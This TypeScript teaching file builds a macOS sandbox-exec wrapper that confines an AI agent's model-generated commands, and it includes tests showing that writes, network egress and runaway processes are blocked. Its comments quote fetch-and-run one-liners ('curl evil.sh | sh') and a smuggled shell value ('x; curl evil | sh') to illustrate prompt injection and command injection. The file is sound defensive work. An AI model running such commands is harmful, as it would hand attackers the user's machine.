// Stage 03 — execution isolation (sandboxing).
//
// The agent loop (stage 01) ends every turn by running whatever the model asked
// for. The moment one of those tools is "run this shell command", the model's
// output becomes code on your machine. The threat is not a malicious model — it
// is an *honest* model acting on poisoned input: a webpage, a README, a tool
// result that says "now run `curl evil.sh | sh`". Prompt injection turns the
// model into a confused deputy, and the deputy has your shell.
//
// So the rule is: never hand model-generated commands straight to exec(). Run
// them inside a sandbox that constrains what the process *can* do, regardless of
// what it *tries* to do. This stage builds a real one with macOS `sandbox-exec`.
//
// Why this is defense in DEPTH, not the whole defense:
//   - This stage (sandbox) limits CAPABILITY — "this process physically cannot
//     write outside /tmp/x or open a socket." It does not understand intent.
//   - Stage 04 (permissions) limits AUTHORIZATION — "should this specific action
//     be allowed, and does a human need to approve it first?" It understands
//     intent but cannot stop a process that already escaped its box.
// You want both. Permissions decide *whether* to run; the sandbox bounds the
// blast radius *when* it runs anyway (bug, bypass, or approved-but-buggy code).
//
// Run it: `npm run stage03`. Offline, no LLM, no network needed — the "model"
// here is just three hardcoded commands standing in for what a model might emit.

import { execFile } from 'node:child_process';
import { mkdtempSync, rmSync, existsSync, realpathSync } from 'node:fs';
import { tmpdir, homedir } from 'node:os';
import { join } from 'node:path';

// --- Why not just exec()? -----------------------------------------------------
//
// `child_process.exec("rm " + path)` is the canonical disaster: the string is
// handed to /bin/sh, so `path = "x; curl evil | sh"` runs two commands. Even the
// "safe" `execFile(cmd, [args])` form (no shell, args not interpolated — and the
// form we use below) only closes the *injection* hole. It does nothing about
// capability: an execFile'd `curl` still reaches the network, an execFile'd
// `cp` still writes your SSH keys. Argument hygiene and capability confinement
// are orthogonal problems. We rely on execFile for the former and the sandbox
// for the latter. We deliberately do NOT demonstrate the destructive exec path
// by running it; the danger is explained, not reproduced.

// --- The honest caveat about sandbox-exec -------------------------------------
//
// `sandbox-exec` (and the Seatbelt / SBPL policy language it speaks) has been
// marked DEPRECATED in Apple's man page for years — yet it still ships in every
// macOS and still works (it is the same machinery Apple uses internally to
// confine system daemons via .sb profiles in /System/Library/Sandbox/Profiles).
// We use it because it is the only zero-install, offline, kernel-enforced
// sandbox on a stock Mac — perfect for a teaching demo. It is NOT what you would
// ship. Production options, roughly ordered weak→strong isolation, and the
// price you pay in startup latency for that strength:
//
//   technique            isolation strength        startup latency    notes
//   -------------------- ------------------------- ------------------ -----------------------------
//   seccomp-bpf / sandbox-exec  syscall/op filter, shared kernel   ~ms      one kernel bug = escape
//   WASM (wasmtime/WASI) memory-safe, no ambient FS/net   ~ms (sub-ms)   must compile tool to WASM
//   container (Docker)   namespaces+cgroups, shared kernel   ~100ms-1s    largest attack surface (host kernel)
//   gVisor (runsc)       user-space kernel intercepts syscalls   ~hundreds of ms   strong, modest syscall overhead
//   Firecracker microVM  real VM, separate guest kernel   ~125ms boot     strongest; used by Lambda/Fly.io
//
// The pattern is monotone: the closer you get to a separate kernel, the harder
// the escape and the slower the cold start. An agent that runs many short tool
// calls feels that latency on every call, which is why "reuse one warm sandbox"
// is itself a design axis. For this demo, a fresh sandboxed process per call is
// fine — correctness over throughput.

export interface SandboxOptions {
  // The ONE directory the command may write to. Everything else on the
  // filesystem is read-only; everything outside is the deny-by-default void.
  // Caller owns the lifecycle of this dir (we create + clean it in main()).
  writableDir: string;
  // Wall-clock ceiling. A sandbox stops a process from reaching OUT; it does
  // nothing about a process that spins forever (a `while true` or `sleep 999`
  // burns your CPU/your bill inside the box). Timeout is the orthogonal control
  // for "took too long" — the agent-loop equivalent of stage 01's maxTurns.
  timeoutMs: number;
}

export interface SandboxResult {
  // 'ok'        — command exited 0 within budget.
  // 'failed'    — command ran but exited non-zero (this is how a DENY surfaces:
  //               the kernel returns EPERM, the command errors out). From the
  //               sandbox's point of view a blocked action is a *success* of the
  //               policy, even though the command "failed".
  // 'timeout'   — we killed it for exceeding timeoutMs.
  // 'no-sandbox'— sandbox-exec is unavailable; we refused to run unconfined.
  outcome: 'ok' | 'failed' | 'timeout' | 'no-sandbox';
  exitCode: number | null;
  stdout: string;
  stderr: string;
}

// SBPL (Sandbox Profile Language) is a Scheme-like DSL. The single most
// important line is `(deny default)`: start from "nothing is allowed" and add
// back only the minimum. A default-allow policy with a deny list is how every
// sandbox eventually gets bypassed — you cannot enumerate all the bad things.
//
// We then grant the bare minimum to run a child process and read the system
// (binaries, libraries, the profile itself live all over the FS, so file-read*
// is broad on purpose — confidentiality is not this demo's threat model;
// integrity + network egress are). The two teeth that matter:
//   - file-write* is scoped to exactly one subpath → no writing your dotfiles.
//   - network* is denied → no exfiltration, no `curl | sh` phone-home, no DNS.
function buildProfile(writableDir: string): string {
  // WARNING: SBPL `subpath` matches against the CANONICAL path. On macOS the OS
  // temp dir is reached via /var/folders/... but /var is a symlink to
  // /private/var, so the kernel checks the policy against /private/var/...
  // A profile granting /var/... would silently deny every write (this exact bug
  // cost a debugging round — the allow looked right but never matched). Resolve
  // symlinks before emitting the rule.
  const canonical = realpathSync(writableDir);
  // NOTE: SBPL has no string-escaping story for paths with quotes/newlines.
  // We mint writableDir ourselves via mkdtemp under the OS temp dir, so it is a
  // known-safe path. If you ever feed a caller-supplied path here, validate it —
  // an attacker-chosen writableDir is its own injection vector.
  return [
    '(version 1)',
    '(deny default)',
    // Let the target binary exec and fork its normal helper processes.
    '(allow process-exec)',
    '(allow process-fork)',
    // Read the whole filesystem: the binary, dyld, shared libs, /etc, the .sb
    // file. Broad reads are acceptable here; the asset we protect is write +
    // network, not file confidentiality. Tighten this if secrets are on disk.
    '(allow file-read*)',
    // sysctl/ioctl that the dynamic linker and libc poke at on startup.
    '(allow sysctl-read)',
    // The whole point: writes confined to one subtree (canonical path).
    `(allow file-write* (subpath "${canonical}"))`,
    // /dev/null, /dev/random etc. — harmless device nodes a normal program uses.
    '(allow file-write-data (literal "/dev/null"))',
    // Explicit, even though deny-default already covers it: no sockets, no DNS,
    // no outbound anything. Stated for the reader and as belt-and-suspenders.
    '(deny network*)',
  ].join('\n');
}

// Run `command` (argv form — no shell, no interpolation) confined by an SBPL
// profile. Returns a SandboxResult; never throws for a denied/failed command —
// a blocked action is an expected outcome, not an exception (rules: business
// failure is a return value, not a throw). Only programmer errors propagate.
export async function runSandboxed(command: string[], opts: SandboxOptions): Promise<SandboxResult> {
  if (!sandboxExecAvailable()) {
    // Fail CLOSED, loudly. The wrong move is to silently fall back to an
    // unconfined exec() because "the sandbox wasn't there" — that is exactly
    // when you most need it. We refuse and tell the caller why.
    return {
      outcome: 'no-sandbox',
      exitCode: null,
      stdout: '',
      stderr: 'sandbox-exec not found; refusing to run model-generated command unconfined.',
    };
  }

  const profile = buildProfile(opts.writableDir);

  // `sandbox-exec -p <inline-profile> -- <argv...>`. We pass the profile inline
  // (-p) rather than writing a temp .sb file: one less artifact to clean up and
  // one less TOCTOU window where someone swaps the file between write and exec.
  const argv = ['-p', profile, '--', ...command];

  return await new Promise<SandboxResult>((resolve) => {
    const child = execFile(
      '/usr/bin/sandbox-exec',
      argv,
      // maxBuffer caps how much output we buffer — an unbounded sandboxed
      // process could otherwise flood us. timeout/killSignal give Node's own
      // watchdog; we double down with our own timer below because Node's
      // `timeout` can miss a process stuck in certain states.
      { timeout: opts.timeoutMs, killSignal: 'SIGKILL', maxBuffer: 1024 * 1024 },
      (err, stdout, stderr) => {
        clearTimeout(watchdog);
        if (timedOut) {
          resolve({ outcome: 'timeout', exitCode: null, stdout, stderr });
          return;
        }
        if (err) {
          // execFile reports non-zero exit as an error carrying `.code`. That is
          // the normal shape of a sandbox DENY (kernel → EPERM → non-zero exit).
          const exitCode = typeof (err as NodeJS.ErrnoException & { code?: number }).code === 'number'
            ? ((err as unknown as { code: number }).code)
            : null;
          resolve({ outcome: 'failed', exitCode, stdout, stderr });
          return;
        }
        resolve({ outcome: 'ok', exitCode: 0, stdout, stderr });
      }
    );

    // Belt-and-suspenders timeout: SIGKILL (not SIGTERM) so a command that traps
    // signals still dies. This is the demo for "a process that ignores the
    // deadline gets killed anyway."
    let timedOut = false;
    const watchdog = setTimeout(() => {
      timedOut = true;
      child.kill('SIGKILL');
    }, opts.timeoutMs);
  });
}

// Cheap existence check. We avoid spawning sandbox-exec just to probe — on a Mac
// the path is stable, and a missing file here means we degrade gracefully.
function sandboxExecAvailable(): boolean {
  return existsSync('/usr/bin/sandbox-exec');
}

// --- Demo: three commands a model might emit, and what the box does with them -

async function main(): Promise<void> {
  console.log('\n=== Stage 03: execution sandboxing (macOS sandbox-exec) ===\n');

  if (!sandboxExecAvailable()) {
    console.log('未找到 /usr/bin/sandbox-exec — 本 demo 仅支持 macOS。');
    console.log('其它平台的等价物：Linux 用 seccomp-bpf / bubblewrap / nsjail，');
    console.log('生产环境用容器 / gVisor / Firecracker microVM / WASM 运行时。');
    return;
  }

  // A fresh, sandbox-owned scratch dir. The command may write here and nowhere
  // else. We clean it up at the end so the demo leaves no trace.
  const sandboxDir = mkdtempSync(join(tmpdir(), 'agent-sbx-'));
  console.log(`writable dir : ${sandboxDir}`);
  console.log('policy       : deny-default · write⊆sandboxDir · network=DENY · timeout=2000ms');
  console.log('注意：sandbox-exec 在 macOS 已标记 deprecated 但仍可用，生产请换容器/gVisor/microVM/WASM。\n');

  const opts: SandboxOptions = { writableDir: sandboxDir, timeoutMs: 2000 };
  // A path OUTSIDE the sandbox. We pick a clearly-marked name under $HOME and
  // assert afterwards that it does NOT exist — proving the write was blocked,
  // not that we got lucky. We never create it ourselves.
  const forbiddenPath = join(homedir(), '.agent-sandbox-escape-probe');

  // Each case states what we EXPECT, runs it, then checks reality against the
  // expectation. PASS = policy behaved as designed (allow stayed allowed, deny
  // stayed denied). This is the test, not eyeballing the output.

  // (a) ALLOWED: write inside the sandbox. Expect success + file present.
  {
    const outFile = join(sandboxDir, 'hello.txt');
    const r = await runSandboxed(['/bin/sh', '-c', `echo "hello from sandbox" > "${outFile}" && cat "${outFile}"`], opts);
    const wroteOk = r.outcome === 'ok' && existsSync(outFile);
    report('a', '沙箱内写文件（应放行）', wroteOk, r, `file exists=${existsSync(outFile)}`);
  }

  // (b) DENIED: write outside the sandbox, into $HOME. Expect failure + the file
  // must NOT exist. If the file appeared, the sandbox FAILED (escape).
  {
    const r = await runSandboxed(['/bin/sh', '-c', `echo "escaped!" > "${forbiddenPath}"`], opts);
    const blocked = r.outcome === 'failed' && !existsSync(forbiddenPath);
    report('b', '沙箱外越权写 $HOME（应拦截）', blocked, r, `escape file exists=${existsSync(forbiddenPath)}`);
    // Safety net: if a future kernel/profile regression let it through, clean up
    // so we never leave an artifact in the user's home.
    if (existsSync(forbiddenPath)) rmSync(forbiddenPath, { force: true });
  }

  // (c) DENIED: network egress. We try curl; expect it to fetch zero bytes and
  // error out (no socket, no DNS). A non-error / non-empty body = exfil path.
  {
    const dst = join(sandboxDir, 'net.out');
    const r = await runSandboxed(
      ['/usr/bin/curl', '-s', '--max-time', '3', 'http://example.com', '-o', dst],
      opts
    );
    // Blocked iff curl did not succeed AND no body landed on disk. (curl exits
    // 6 "couldn't resolve host" because even DNS is denied.)
    const gotBytes = existsSync(dst);
    const blocked = r.outcome !== 'ok' && !gotBytes;
    report('c', '网络外联 curl（应拦截）', blocked, r, `fetched any bytes=${gotBytes}`);
  }

  // (d) TIMEOUT: a command that outlasts the deadline gets SIGKILLed. The
  // sandbox bounds *space* (what you can touch); the timeout bounds *time*.
  {
    const r = await runSandboxed(['/bin/sleep', '10'], { writableDir: sandboxDir, timeoutMs: 800 });
    const killed = r.outcome === 'timeout';
    report('d', 'sleep 10 超过 800ms 超时（应被杀）', killed, r, `outcome=${r.outcome}`);
  }

  rmSync(sandboxDir, { recursive: true, force: true });
  console.log('\n清理完成。沙箱(挡“能做什么”) + 下一章权限(挡“准不准做”) = 纵深防御。\n');
}

// One-line verdict per case. We surface the raw outcome/exit so a FAIL is
// debuggable, not just a red mark.
function report(id: string, what: string, pass: boolean, r: SandboxResult, detail: string): void {
  const verdict = pass ? 'PASS' : 'FAIL';
  const trimmedErr = r.stderr.trim().replace(/\s+/g, ' ').slice(0, 80);
  console.log(
    `[${verdict}] (${id}) ${what}\n` +
      `        outcome=${r.outcome} exit=${r.exitCode ?? 'n/a'} ${detail}` +
      (trimmedErr ? `\n        stderr: ${trimmedErr}` : '')
  );
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
